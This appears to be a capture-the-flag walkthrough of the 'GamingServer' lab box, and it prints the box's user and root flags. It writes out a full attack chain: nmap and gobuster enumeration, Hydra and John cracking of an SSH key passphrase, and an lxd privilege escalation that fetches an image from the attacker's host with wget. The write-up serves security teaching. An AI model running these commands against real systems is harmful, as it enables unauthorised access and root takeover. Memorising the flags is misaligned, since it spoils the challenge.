# GamingServer

An Easy Boot2Root box for beginners

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

# What is the user flag?

## Service enumeration

Starting with service enumeration, Nmap reveals 2 services on their standard ports, respectively SSH and web on ports 22/tcp and 80/tcp.

~~~
kali@kali:/data/Gaming_Server$ nmap -sC -sV -A 10.10.165.55
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 13:08 CEST
Nmap scan report for 10.10.165.55
Host is up (0.071s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Main page source code

The main page source code reveals an interesting comment:

~~~
kali@kali:/data/vpn$ curl -s http://10.10.165.55 | grep "<\!--"
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
~~~

`john` is probably a valid username.

## Hidden directories

There is a `robots.txt` file that discloses a hidden `/uploads` location:

~~~
kali@kali:/data/Gaming_Server/files$ curl -s http://10.10.165.55/robots.txt
user-agent: *
Allow: /
/uploads/
~~~

3 files are hosted in this directory:

* `/uploads/dict.lst`: a dictionary, likely to be used to bruteforce passwords.
* `/uploads/manifesto.txt`: a manifesto file written by a hacker, not interesting here.
* `/uploads/meme.jpg`: a picture, not interesting here

At this stage, I tried to brute force john's SSH password using the `dict.lst` dictionary, but it failed:

~~~
kali@kali:/data/Gaming_Server/files$ hydra -l john -P dict.lst ssh://10.10.165.55
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 15:34:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking ssh://10.10.165.55:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 46 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 15:36:35
~~~

## gobuster

Further enumerating the web server with `gobuster`, I was able to find a hidden `/secret` location:

~~~
kali@kali:/data/Gaming_Server/files$ gobuster dir -u http://10.10.165.55 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.165.55
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/02 13:26:41 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
~~~

## SSH private key

This location hosts a `secretKey` file that is likely a SSH private key. Let's try to connect as john using this key:

~~~
kali@kali:/data/Gaming_Server/files$ chmod 400 secretKey 
kali@kali:/data/Gaming_Server/files$ ssh -i secretKey john@10.10.165.55
load pubkey "secretKey": invalid format
Enter passphrase for key 'secretKey': 
john@10.10.165.55's password: 
~~~

The key is password protected. This is likely where we need the dictionary. Let's brute force the key with John:

~~~
kali@kali:/data/Gaming_Server/files$ /data/src/john/run/ssh2john.py secretKey > ssh.hash
kali@kali:/data/Gaming_Server/files$ /data/src/john/run/john ssh.has --wordlist=dict.lst
stat: ssh.has: No such file or directory
kali@kali:/data/Gaming_Server/files$ /data/src/john/run/john ssh.hash --wordlist=dict.lst
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
1g 0:00:00:00 DONE (2020-09-02 13:30) 11.11g/s 2466p/s 2466c/s 2466C/s baseball..starwars
Session completed. 
~~~

## SSH access and user flag

John has successfully found the password: `letmein`. Now, we can connect and get the user flag:

~~~
kali@kali:/data/Gaming_Server/files$ ssh -i secretKey john@10.10.165.55
john@exploitable:~$ cat user.txt 
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
~~~

User flag: `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`


# What is the root flag?

## John belongs to the lxd group

We can't check john's privileges with `sudo -l` because it requires john's password that we don't have. Searching for root files with SUID bit doesn't reveal anything that would help to elevate our privileges.

But checking groups john is part of with the `id` region reveals the `lxd` group.

~~~
~ # john@exploitable:/tmp$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
~~~

## Privesc

Searching for privilege escalation with `lxd` on the Internet led me to this [post](https://www.hackingarticles.in/lxd-privilege-escalation/). Let's test.

In Kali:

~~~
# git clone  https://github.com/saghul/lxd-alpine-builder.git
# cd lxd-alpine-builder
# ./build-alpine
# python3 -m http.server
~~~

On the target:

~~~
john@exploitable:/tmp$ wget http://10.8.50.72:8000/alpine-v3.12-x86_64-20200902_1515.tar.gz
john@exploitable:/tmp$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200902_1515.tar.gz --alias myimage
Image imported with fingerprint: 65dd1e31f4cc984602e9be582bf80196cd05d44531b18ad8208ce062f09105ab
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 65dd1e31f4cc | no     | alpine v3.12 (20200902_15:15) | x86_64 | 3.04MB | Sep 2, 2020 at 1:18pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~~~

## Root flag

Now that we are root, let's get the flag

~~~
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
~ # cat /mnt/root/root/root.txt 
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
~~~

Root flag: `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`
